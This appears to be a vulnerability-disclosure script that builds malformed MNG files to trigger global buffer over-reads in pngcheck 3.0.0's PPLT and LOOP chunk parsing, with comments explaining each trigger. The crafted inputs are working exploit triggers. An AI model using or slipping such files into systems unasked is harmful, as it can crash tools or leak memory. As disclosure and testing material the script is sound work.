#!/usr/bin/env python3
"""
PNGCheck Vulnerability POC Generator
Generates POC files demonstrating multiple vulnerabilities in pngcheck 3.0.0:

- Global buffer over-read in PPLT chunk when last_index < first_index
- Global buffer over-read in LOOP chunk due to unchecked chunk size

Each POC can be generated individually or all at once using the 'all' option.
"""

import argparse
import pathlib
import zlib

from construct import Bytes, Const, GreedyRange, Int32ub, Struct, this

Chunk = Struct(
    "length" / Int32ub,
    "type" / Bytes(4),
    "data" / Bytes(this.length),
    "crc" / Int32ub,
)


MNG = Struct(
    "signature" / Const(b"\x8aM\x4e\x47\x0d\x0a\x1a\x0a"),
    "chunks" / GreedyRange(Chunk),
)


def create_chunk(chunk_type: bytes, chunk_data: bytes) -> dict:
    return {
        "length": len(chunk_data),
        "type": chunk_type,
        "data": chunk_data,
        "crc": zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF,
    }


def generate_poc(
    file_format: Struct, chunks: list[tuple[bytes, bytes]], output_path: pathlib.Path
) -> None:
    file_format.build_file(
        dict(chunks=[create_chunk(*chunk) for chunk in chunks]),
        output_path,
    )


POCS = {
    # PPLT chunk
    # Command: pngcheck poc-pplt.mng
    "pplt": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (
                b"PPLT",
                b"\x04"  # pplt_delta_type(1)
                + b"\xff\x00" * 64,  # (first_index(1) + last_index(1)) * 64
                # when last_idx(0x00) < first_idx(0xff), bytes_left += samples * 256
            ),
            (b"MEND", b""),
        ],
    ),
    # LOOP chunk
    # Command: pngcheck -v poc-loop.mng
    "loop": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (
                b"LOOP",
                b"\x00"  # nest_level(1)
                + b"\x00\x00\x00\x01"  # iteration_count(4)
                + b"\x00"  # termination_condition(1)
                + b"\x00\x00\x00\x01" * 10000,  # Iteration_min(4) + ...
            ),
            (b"MEND", b""),
        ],
    ),
}


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Generate POC files for pngcheck 3.0.0 vulnerabilities (global buffer "
            "over-read in PPLT and LOOP chunks)"
        )
    )
    parser.add_argument(
        "type",
        choices=["all"] + list(POCS.keys()),
        help="Vulnerability type to generate POC for ('all' to generate all types)",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=pathlib.Path,
        help="Output file path (default: poc-<type>.mng)",
    )
    args = parser.parse_args()

    if args.type == "all":
        for poc_type, (file_format, chunks) in POCS.items():
            output_path = args.output or pathlib.Path(f"poc-{poc_type}.mng")
            print(f"Generating {poc_type} chunk vulnerability POC...")
            generate_poc(file_format, chunks, output_path)
        print("POC files generated successfully")
    else:
        file_format, chunks = POCS[args.type]
        if not args.output:
            args.output = pathlib.Path(f"poc-{args.type}.mng")
        print(f"Generating {args.type} chunk vulnerability POC...")
        generate_poc(file_format, chunks, args.output)
        print("POC file generated successfully")


if __name__ == "__main__":
    main()
